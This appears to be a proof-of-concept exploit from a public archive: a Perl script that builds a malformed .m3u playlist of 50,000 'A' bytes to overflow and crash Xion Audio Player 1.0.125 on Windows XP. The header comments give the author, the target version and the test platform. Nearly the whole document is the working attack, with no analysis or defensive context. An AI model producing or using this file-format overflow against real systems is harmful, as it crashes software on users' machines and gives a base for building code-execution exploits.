#!/usr/bin/perl
# Xion Audio Player version: 1.0.125
# Author: hadji samir        , s-dz@hotmail.fr
# Download : http://xion.r2.com.au/index.php?page=download
# Tested : Windows XP SP2 (fr)
# DATE   : 2010-07-31
#
#  thanks mo3taz  wnass cfa nta3 blida
#
#  et samir tjrs mahboul-3lik
#
################################################################### 

my $file= "mahboul-3lik00.m3u";

my $junk= "\x41" x  50000;
 
open($FILE, ">$file");
print($FILE $junk);
close($FILE);
print("exploit created successfully");